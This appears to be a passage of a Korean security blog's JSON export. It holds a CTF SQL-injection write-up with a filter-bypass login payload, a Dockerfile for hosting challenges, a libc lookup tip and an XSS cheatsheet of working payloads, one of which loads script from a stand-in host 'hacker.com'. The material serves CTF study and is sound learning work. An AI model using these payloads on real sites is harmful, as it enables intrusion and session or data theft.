sqli1234567891011121314151617181920212223242526272829303132333435&lt;?php //error_reporting(E_ALL); //ini_set(&quot;display_errors&quot;, 1); require &#x27;lib.php&#x27;; if (isset($_GET[&#x27;view-source&#x27;]))&#123; highlight_file(__FILE__); exit; &#125; $id = $_POST[&#x27;id&#x27;]; $pw = $_POST[&#x27;pw&#x27;]; //var_dump($conn); if (preg_match(&quot;/information|admin|or|\\=| |\\#|\\&#x27;|_|where/i&quot;, $id . $pw)) die(&quot;No Hack ~_~&quot;); if (isset($id, $pw)) &#123; $query = &quot;SELECT * FROM `users` WHERE `id` = trim(&#x27;&#123;$id&#125;&#x27;) AND `pw` = trim(&#x27;&#123;$pw&#125;&#x27;)&quot;; $result = mysqli_fetch_array(mysqli_query($conn, $query)); if ($result[&#x27;id&#x27;] === &#x27;admin&#x27;) echo &quot;&lt;h1&gt;&#123;$flag&#125;&lt;/h1&gt;&quot;; if ($result[&#x27;id&#x27;]) &#123; $message = &quot;&#123;$result[&#x27;id&#x27;]&#125;님 안녕하세요!&quot;; &#125; else &#123; $message = &quot;로그인에 실패하였습니다. 다시 시도해주세요.&quot;; &#125; &#125; ?&gt; 페이지 로그인 코드는 다음과 같다.$id, $pw 에 입력되는 값에서 information, admin, or 등 여러가지를 필터링 한다. 이 정규식 검증 부분들은 tab, like 문자를 통해서 쿼리문을 완성할 수 있다. 1id=\\&amp;pw=)|| id like &quot;ad&quot; &quot;min&quot;-- -","categories":[],"tags":[{"name":"CTF, Web","slug":"CTF-Web","permalink":"https://blog.jhyeon.dev/tags/CTF-Web/"}]},{"title":"CTF Web Challenge(Dockerfile)","slug":"dockerfile-200205","date":"2020-02-04T15:00:00.000Z","updated":"2021-01-17T07:52:18.975Z","comments":true,"path":"2020/02/05/dockerfile-200205/","link":"","permalink":"https://blog.jhyeon.dev/2020/02/05/dockerfile-200205/","excerpt":"","text":"간단한 버전이라서 쓰는 사람에 맞게 적절히 수정하면 된다. 12345678910111213141516FROM ubuntu:18.04ENV DEBIAN_FRONTEND=noninteractiveENV TERM=linuxRUN apt-get update -yRUN apt-get install apache2 -yRUN apt-get install libapache2-mod-php -yRUN apt-get install php -yRUN apt-get install vim -yCOPY ./files /var/www/htmlRUN rm -rf /var/www/html/index.htmlEXPOSE 포트번호CMD [&quot;/usr/sbin/apache2ctl&quot;, &quot;-D&quot;, &quot;FOREGROUND&quot;]","categories":[{"name":"Docker","slug":"Docker","permalink":"https://blog.jhyeon.dev/categories/Docker/"}],"tags":[{"name":"Dockerfile, Docker","slug":"Dockerfile-Docker","permalink":"https://blog.jhyeon.dev/tags/Dockerfile-Docker/"}]},{"title":"libc database search(bluekat)","slug":"pwnbluekat-200205","date":"2020-02-04T15:00:00.000Z","updated":"2021-01-17T08:08:00.797Z","comments":true,"path":"2020/02/05/pwnbluekat-200205/","link":"","permalink":"https://blog.jhyeon.dev/2020/02/05/pwnbluekat-200205/","excerpt":"","text":"예전에 포너블 공부할 때 rop 문제에서 오프셋 기반으로립씨 버전 하나하나 찾으려니 솔직히 너무 귀찮았다.. 그래서 찾아보다가 libc bluekat 이라는 사이트를 찾았는데,함수 오프셋을 통해서 일치하는 libc 버전을 간단하게 찾아 주었다! 포너블 하신다면 자주 이용해먹으면 좋을 것 같다. [https://libc.blukat.me](libc-bluekat homepage)","categories":[{"name":"Pwnable","slug":"Pwnable","permalink":"https://blog.jhyeon.dev/categories/Pwnable/"}],"tags":[{"name":"Tools","slug":"Tools","permalink":"https://blog.jhyeon.dev/tags/Tools/"}]},{"title":"xss cheatsheet 2020","slug":"xsscheatsheet-200205","date":"2020-02-04T15:00:00.000Z","updated":"2021-01-17T08:41:42.050Z","comments":true,"path":"2020/02/05/xsscheatsheet-200205/","link":"","permalink":"https://blog.jhyeon.dev/2020/02/05/xsscheatsheet-200205/","excerpt":"","text":"1234567891011121314151617&lt;script&gt;alert(1)&lt;/script&gt;&lt;Script&gt;alert(1)&lt;/Script&gt;&lt;svg onload=alert(1)&gt;&lt;img src=&quot;#&quot; onerror=alert(1)&gt;&lt;script src=&quot;hacker.com/hack.js&quot;&gt;&lt;/script&gt;&lt;a href=&quot;javascript:alert(1)&quot;&gt;cilck me&lt;/a&gt;&lt;iframe src=&quot;javascript:alert(1)&quot;&gt;&lt;/iframe&gt;&lt;embed src=&quot;javascript:alert(1)&quot;&gt;&lt;/embed&gt;&lt;body onload=&quot;alert(1);&quot;&gt;&lt;body onunload=&quot;alert(1);&quot;&gt;&quot;&gt;&lt;svg onload=alert(1)&gt;&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt; &lt;/style&gt;&lt;svg onload=alert(1)&gt; data:text/html,&lt;svg onload=alert(1)&gt; &lt;/script&gt;&lt;svg onload=alert(1)&gt; */alert(1)&lt;/script&gt;&lt;script&gt;/* constructor.constructor(&#x27;alert(/xss/)&#x27;)()&#125;&#125;","categories":[{"name":"Web","slug":"Web","permalink":"https://blog.jhyeon.dev/categories/Web/"}],"tags":[{"name":"Web, XSS, CheatSheet","slug":"Web-XSS-CheatSheet","permalink":"https://blog.jhyeon.dev/tags/Web-XSS-CheatSheet/"}]}],"categories":[{"name":"Docker","slug":"Docker","permalink":"https://blog.jhyeon.dev/categories/Docker/"},{"name":"Web","slug":"Web","permalink":"https://blog.jhyeon.dev/categories/Web/"},{"name":"Pwnable","slug":"Pwnable","permalink":"https://blog.jhyeon.dev/categories/Pwnable/"},{"name":"CTF","slug":"CTF","permalink":"https://blog.jhyeon.dev/categories/CTF/"},{"name":"Wargame","slug":"Wargame","permalink":"https://blog.jhyeon.dev/categories/Wargame/"}],"tags":[{"name":"Dockerfile, Docker","slug":"Dockerfile-Docker","permalink":"https://blog.jhyeon.dev/tags/Dockerfile-Docker/"},{"name":"Web, JWT","slug":"Web-JWT","permalink":"https://blog.jhyeon.dev/tags/Web-JWT/"},{"name":"Web, PHP","slug":"Web-PHP","permalink":"https://blog.jhyeon.dev/tags/Web-PHP/"},{"name":"Pwn, Mprotect, Shellcode, Exploitation","slug":"Pwn-Mprotect-Shellcode-Exploitation","permalink":"https://blog.jhyeon.dev/tags/Pwn-Mprotect-Shellcode-Exploitation/"},{"name":"Web, CTF","slug":"Web-CTF","permalink":"https://blog.jhyeon.dev/tags/Web-CTF/"},{"name":"Web, Wargame","slug":"Web-Wargame","permalink":"https://blog.jhyeon.dev/tags/Web-Wargame/"},{"name":"Pwn, ROP","slug":"Pwn-ROP","permalink":"https://blog.jhyeon.dev/tags/Pwn-ROP/"},{"name":"CTF, Web","slug":"CTF-Web","permalink":"https://blog.jhyeon.dev/tags/CTF-Web/"},{"name":"Tools","slug":"Tools","permalink":"https://blog.jhyeon.dev/tags/Tools/"},{"name":"Web, XSS, CheatSheet","slug":"Web-XSS-CheatSheet","permalink":"https://blog.jhyeon.dev/tags/Web-XSS-CheatSheet/"}]}